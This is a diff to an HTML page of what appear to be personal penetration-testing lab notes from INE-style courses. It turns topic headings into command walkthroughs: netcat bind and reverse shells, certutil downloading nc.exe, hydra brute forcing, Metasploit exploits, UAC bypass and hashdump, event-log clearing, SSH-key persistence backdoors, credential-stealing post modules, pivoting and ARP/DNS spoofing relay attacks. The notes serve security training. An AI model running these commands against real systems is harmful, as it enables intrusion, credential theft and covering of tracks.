@@ -645,22 +645,126 @@ if (!doNotTrack) {
                 
                 <h2 id="exploitation">Exploitation</h2>
 <ul>
-<li>banner grabber</li>
-<li>vulnerability scanning with nmap</li>
-<li>fixing exploits</li>
-<li>netcat fundamentals</li>
-<li>bind shells</li>
-<li>reverse shells</li>
-<li>msf</li>
-<li>windows port scanning and enumeration</li>
-<li>targeting microsoft iis ftp</li>
-<li>targeting openssh</li>
-<li>targeting smb</li>
-<li>targeting mysql database server</li>
-<li>linux port scanning and enumeration</li>
-<li>targeting vsftpd</li>
-<li>targeting php</li>
-<li>targeting samba</li>
+<li>banner grabber
+<ul>
+<li>using nmap <code>nmap -sV --script=banner 192.8.94.3</code></li>
+<li>using netcat <code>nc 192.8.94.3 22</code></li>
+</ul>
+</li>
+<li>vulnerability scanning with nmap
+<ul>
+<li>find open ports <code>nmap -sV -O 192.152.25.3</code></li>
+<li>find cgi script in apache website, use nmap to check shellshock vulnerability <code>nmap -sV -p 80 --script=http-shellshock --script-args &quot;http-shellshock.uri=/gettime.cgi&quot; 192.152.25.3</code></li>
+</ul>
+</li>
+<li>fixing exploits
+<ul>
+<li>using searchsploit <code>searchsploit HTTP File Server 2.3</code></li>
+<li>download the exploit <code>searchsploit -m 39161</code></li>
+<li>modify the exploit to the correct local port and ip</li>
+<li>use the script to get a reverse shell</li>
+</ul>
+</li>
+<li>netcat fundamentals
+<ul>
+<li>netcat connect with open port <code>nc 10.0.27.35 80</code></li>
+<li>verbose and disable dns resolution <code>nc -nv 10.0.27.35 80</code></li>
+<li>connecting to udp ports <code>nc -nvu 10.0.27.35 161</code></li>
+<li>transfer netcat binary to windows system <code>cd /usr/share/windows-binaries</code> <code>python -m SimpleHTTPServer 80</code> <code>certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe</code></li>
+</ul>
+</li>
+<li>bind shells
+<ul>
+<li>setup listener in windows <code>nc.exe -nvlp 1234 -e cmd.exe</code></li>
+<li>connect it from linux <code>nc.exe -nv 10.10.31.2 1234</code></li>
+</ul>
+</li>
+<li>reverse shells
+<ul>
+<li>setup listener in linux <code>nc -nvlp 1234</code></li>
+<li>connect it from windows <code>nc.exe -nv 10.10.0.2 1234 -e cmd.exe</code></li>
+</ul>
+</li>
+<li>msf
+<ul>
+<li>exploit processmaker <code>use exploit/multi/http/processmaker_exec</code></li>
+</ul>
+</li>
+<li>windows port scanning and enumeration
+<ul>
+<li>scan <code>nmap -sV demo.ine.local</code></li>
+<li>check the smb <code>nmap -sV -sC -p 445 demo.ine.local</code></li>
+<li>check the smb version <code>use /auxiliary/scanner/smb/smb_version</code></li>
+</ul>
+</li>
+<li>targeting microsoft iis ftp
+<ul>
+<li>scan <code>nmap -sV -sC -p21,80 demo.ine.local</code></li>
+<li>check ftp access <code>ftp demo.ine.local 21</code></li>
+<li>bruteforce smb <code>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ftp</code></li>
+<li>login again <code>ftp demo.ine.local 21</code></li>
+</ul>
+</li>
+<li>targeting openssh
+<ul>
+<li>scan <code>nmap -sV -sC -p 22 demo.ine.local</code></li>
+<li>search exploit <code>searchsploit OpenSSH 7.1</code></li>
+<li>bruteforce <code>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh</code></li>
+<li>login <code>ssh vagrant@demo.ine.local</code></li>
+</ul>
+</li>
+<li>targeting smb
+<ul>
+<li>scan <code>nmap -sV -sC -p 445 demo.ine.local</code></li>
+<li>bruteforce <code>hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb</code> <code>hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb</code></li>
+<li>enum4linux to check other users <code>enum4linux -u vagrant -p vagrant -U demo.ine.local</code></li>
+<li>impacket remotely login <code>python3 psexec.py Administrator@demo.ine.local</code></li>
+<li>msf remote login <code>use exploit/windows/smb/psexec</code> set the exploit with <code>set payload windows/x64/meterpreter/reverse_tcp</code></li>
+</ul>
+</li>
+<li>targeting mysql database server
+<ul>
+<li>scan <code>nmap -sV -sC -p 3306 demo.ine.local</code></li>
+<li>find the exploits <code>searchsploit MySQL 5.5</code></li>
+<li>bruteforce msf <code>use auxiliary/scanner/mysql/mysql_login</code> <code>set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt</code></li>
+<li>login to sql server <code>mysql -u root -p -h demo.ine.local</code></li>
+<li>sql commands <code>show databases;</code> <code>use wordpress;</code> <code>show tables;</code> <code>select * from wp_users;</code></li>
+<li>exploit wordpress database, change password <code>UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';</code></li>
+</ul>
+</li>
+<li>linux port scanning and enumeration
+<ul>
+<li>scan port <code>nmap -sV -p1-10000 10.0.20.13 </code></li>
+<li>use netcat to grab banner for unknown services</li>
+<li><code>nc -nv 10.0.20.13 1524</code> gives a shell</li>
+<li>port 80 is a webdav server</li>
+</ul>
+</li>
+<li>targeting vsftpd
+<ul>
+<li>scan <code>nmap -sV -sC -p 21 demo.ine.local</code></li>
+<li>check anonymous login <code>ftp demo.ine.local 21</code></li>
+<li>searchsploit <code>searchsploit vsftpd</code></li>
+<li>metasploit doesn&rsquo;t work, ftp patched <code>use exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+<li>ftp bruteforce <code>hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp</code></li>
+<li>login again <code>ftp demo.ine.local 21</code></li>
+</ul>
+</li>
+<li>targeting php
+<ul>
+<li>scan apache <code>nmap -sV -sC -p 80 demo.ine.local</code>, check <code>phpinfo.php</code> file</li>
+<li>use searchsploit <code>searchsploit php cgi</code></li>
+<li>msf module <code>use exploit/multi/http/php_cgi_arg_injection</code></li>
+</ul>
+</li>
+<li>targeting samba
+<ul>
+<li>scan <code>nmap -sV -p 445 demo.ine.local</code></li>
+<li>check version <code>use auxiliary/scanner/smb/smb_version</code></li>
+<li>search exploit <code>searchsploit samba 3.0.20</code></li>
+<li>use exploit <code>use exploit/multi/samba/usermap_script</code></li>
+</ul>
+</li>
 </ul>
 
                 
@@ -1041,26 +1145,131 @@ if (!doNotTrack) {
                 
                 <h2 id="metasploit-framework-msf">Metasploit Framework (MSF)</h2>
 <ul>
-<li>windows http file server</li>
-<li>windows java web server</li>
-<li>vulnerable ftp server</li>
-<li>vulnerable file sharing service</li>
-<li>vulnerable ssh server</li>
-<li>vulnerable smtp server</li>
-<li>meterpreter basics</li>
-<li>upgrading shells to meterpreter</li>
-<li>windows post exploitation</li>
-<li>uac bypass, msf memory injection</li>
-<li>exploiting smb with psexec</li>
-<li>windows enable remote desktop</li>
-<li>clearing windows event logs</li>
-<li>pivoting</li>
-<li>post exploitation lab I</li>
-<li>privilege escalation, rootkit scanner</li>
-<li>post exploitation lab II</li>
-<li>establishing persistence on linux</li>
-<li>port scanning and enumeration with armitage</li>
-<li>exploitation and post exploitation with armitage</li>
+<li>windows http file server
+<ul>
+<li>use msf module <code>exploit/windows/http/rejetto_hfs_exec</code></li>
+</ul>
+</li>
+<li>windows java web server
+<ul>
+<li>exploit the tomcat <code>exploit/multi/http/tomcat_jsp_upload_bypass</code></li>
+</ul>
+</li>
+<li>vulnerable ftp server
+<ul>
+<li>vsftpd is backdoored <code>exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+</ul>
+</li>
+<li>vulnerable file sharing service
+<ul>
+<li>exploit the samba server <code>exploit/linux/samba/is_known_pipename</code></li>
+</ul>
+</li>
+<li>vulnerable ssh server
+<ul>
+<li>msf module <code>auxiliary/scanner/ssh/libssh_auth_bypass</code></li>
+</ul>
+</li>
+<li>vulnerable smtp server
+<ul>
+<li>haraka mail server <code>exploit/linux/smtp/haraka</code>, set <code>SRVPORT 9898</code> <code>email_to root@attackdefense.test</code> <code>payload linux/x64/meterpreter_reverse_http</code></li>
+</ul>
+</li>
+<li>meterpreter basics
+<ul>
+<li>check the php file and realise xdebug enabled, use <code>exploit/unix/http/xdebug_unauth_exec</code></li>
+<li>available commands <code>pwd</code> <code>ls</code> <code>lpwd</code> <code>lls</code> <code>edit</code> <code>cat</code> <code>download</code> <code>unzip</code> <code>rm</code> <code>checksum</code> <code>getenv PATH</code> <code>search -d /usr/bin -f *ckdo*</code> <code>lcd</code> <code>upload</code></li>
+</ul>
+</li>
+<li>upgrading shells to meterpreter
+<ul>
+<li>exploit samba again <code>exploit/linux/samba/is_known_pipename</code> to get shell, upgrade to meterpreter with <code>post/multi/manage/shell_to_meterpreter</code></li>
+</ul>
+</li>
+<li>windows post exploitation
+<ul>
+<li>exploit hfs first to get shell <code>exploit/windows/http/rejetto_hfs_exec</code></li>
+<li>post exploitation using <code>post/windows/gather/win_privs</code> <code>post/windows/gather/enum_logged_on_users</code> <code>post/windows/gather/checkvm</code> <code>post/windows/gather/enum_applications</code> <code>post/windows/gather/enum_computers</code> <code>post/windows/gather/enum_shares</code></li>
+</ul>
+</li>
+<li>uac bypass, msf memory injection
+<ul>
+<li>exploit the hsf server <code>exploit/windows/http/rejetto_hfs_exec</code>, migrate to privileged process <code>ps -S explorer.exe</code> <code>migrate 2124</code> <code>getsystem</code></li>
+<li>to use the memory injection, background the session and use <code>exploit/windows/local/bypassuac_injection</code>, migrate again and you can dump hashes <code>ps -S lsass.exe</code> <code>migrate 484</code> <code>hashdump</code></li>
+</ul>
+</li>
+<li>exploiting smb with psexec
+<ul>
+<li>msf module to bruteforce <code>auxiliary/scanner/smb/smb_login</code>, set <code>USER_FILE</code> <code>PASS_FILE</code> <code>RHOSTS</code> and <code>VERBOSE</code></li>
+<li>msf module to gain access <code>exploit/windows/smb/psexec</code>, set <code>RHOSTS</code> <code>SMBUser</code> and <code>SMBPass</code></li>
+</ul>
+</li>
+<li>windows enable remote desktop
+<ul>
+<li>exploit the badblue <code>exploit/windows/http/badblue_passthru</code></li>
+<li>enable the rdp post exploit <code>use post/windows/manage/enable_rdp</code></li>
+</ul>
+</li>
+<li>clearing windows event logs
+<ul>
+<li>its just the <code>clearev</code></li>
+</ul>
+</li>
+<li>pivoting
+<ul>
+<li>exploit the hfs <code>use exploit/windows/http/rejetto_hfs_exec</code>, use the autoroute <code>run autoroute -s 10.0.16.0/20</code></li>
+<li>port forwarding in metasploit with <code>portfwd add -l 1234 -p 80 -r demo2.ine.local</code> and check the list with <code>portfwd list</code></li>
+<li>exploit the badblue on the internal server <code>exploit/windows/http/badblue_passthru</code></li>
+</ul>
+</li>
+<li>linux post exploitation lab I
+<ul>
+<li>exploit using <code>use exploit/linux/samba/is_known_pipename</code></li>
+<li>gather configuration files <code>use post/linux/gather/enum_configs</code></li>
+<li>gather environmental variables <code>use post/multi/gather/env</code></li>
+<li>gather network settings <code>use post/linux/gather/enum_network</code></li>
+<li>check system protections <code>use post/linux/gather/enum_protections</code></li>
+<li>gather system info <code>use post/linux/gather/enum_system</code></li>
+<li>check if inside container <code>use post/linux/gather/checkcontainer</code></li>
+<li>check if inside vm <code>use post/linux/gather/checkvm</code></li>
+<li>check user history <code>use post/linux/gather/enum_users_history</code></li>
+<li>spawn other types of shell <code>use post/multi/manage/system_session</code></li>
+<li>download file using meterpreter <code>use post/linux/manage/download_exec</code></li>
+</ul>
+</li>
+<li>privilege escalation, rootkit scanner
+<ul>
+<li>its a vulnerable rootkit scanner called chkrootkit found using <code>ps -aux</code>, exploit using <code>use exploit/unix/local/chkrootkit</code></li>
+</ul>
+</li>
+<li>linux post exploitation lab II
+<ul>
+<li>gather ssh credentials <code>use post/multi/gather/ssh_creds</code></li>
+<li>gather docker credentials <code>use post/multi/gather/docker_creds</code></li>
+<li>dump hashes <code>use post/linux/gather/hashdump</code></li>
+<li>extract ecrypt folder which may have credentials <code>use post/linux/gather/ecryptfs_creds</code></li>
+<li>extract wifi credentials <code>use post/linux/gather/enum_psk</code></li>
+<li>extract xchat <code>use post/linux/gather/enum_xchat</code></li>
+<li>extract phpmyadmin <code>use post/linux/gather/phpmyadmin_credsteal</code></li>
+<li>extract pptp tunneling protocol using <code>use post/linux/gather/pptpd_chap_secrets</code></li>
+<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
+</ul>
+</li>
+<li>establishing persistence on linux
+<ul>
+<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
+</ul>
+</li>
+<li>port scanning and enumeration with armitage
+<ul>
+<li>GUI for metasploit, click <code>open shell</code></li>
+</ul>
+</li>
+<li>exploitation and post exploitation with armitage
+<ul>
+<li>GUI for metasploit, open meterpreter and dump hashes</li>
+</ul>
+</li>
 </ul>
 
                 
@@ -1225,9 +1434,38 @@ if (!doNotTrack) {
 </ul>
 <h2 id="network-based-attacks">Network-Based Attacks</h2>
 <ul>
-<li>netbios hacking</li>
-<li>snmp analysis</li>
-<li>dns and smb relay attack</li>
+<li>netbios hacking
+<ul>
+<li>get the security level <code>nmap -p445 --script smb-security-mode demo.ine.local</code></li>
+<li>check for anonymous access <code>smbclient -L  demo.ine.local</code></li>
+<li>enumerate users with nmap <code>nmap -p445 --script smb-enum-users.nse  demo.ine.local</code></li>
+<li>using hydra with the list of users <code>hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb</code></li>
+<li>getting meterpreter with credentials msf module <code>exploit/windows/smb/psexec</code></li>
+<li>pivot by adding route <code>run autoroute -s 10.0.22.69/20</code></li>
+<li>start a socks proxy, check the port <code>cat /etc/proxychains4.conf</code> and use msf module <code>use auxiliary/server/socks_proxy</code> and set <code>SRVPORT 9050</code> <code>VERSION 4a</code></li>
+<li>nmap over socket connection <code>proxychains nmap demo1.ine.local -sT -Pn -sV -p 445</code></li>
+<li>migrate to <code>migrate -N explorer.exe</code> and use <code>net view 10.0.22.69</code> list shares on internal device</li>
+<li>map the shares to drive <code>net use D: \\10.0.22.69\Documents</code></li>
+</ul>
+</li>
+<li>snmp analysis
+<ul>
+<li>snmp nmap bruteforce <code>nmap -sU -p 161 --script=snmp-brute demo.ine.local</code> to get community string</li>
+<li>get information on community string using <code>snmpwalk -v 1 -c public demo.ine.local</code></li>
+<li>nmap get all info on snmp <code>nmap -sU -p 161 --script snmp-* demo.ine.local &gt; snmp_output</code></li>
+<li>using list of users, we can bruteforce smb using hydra <code>hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb</code></li>
+<li>login to smb using msf module <code>exploit/windows/smb/psexec</code></li>
+</ul>
+</li>
+<li>dns and smb relay attack
+<ul>
+<li>setup the relay using msf module <code>exploit/windows/smb/smb_relay</code></li>
+<li>configure dnsspoof <code>echo &quot;172.16.5.101 *.sportsfoo.com&quot; &gt; dns</code> <code>dnsspoof -i eth1 -f dns</code></li>
+<li>enable port forwarding <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<li>start arp spoof for both sides <code>arpspoof -i eth1 -t 172.16.5.5 172.16.5.1</code> <code>arpspoof -i eth1 -t 172.16.5.1 172.16.5.5</code></li>
+<li>once it receives the connection, you get a meterpreter shell</li>
+</ul>
+</li>
 </ul>
 
                 
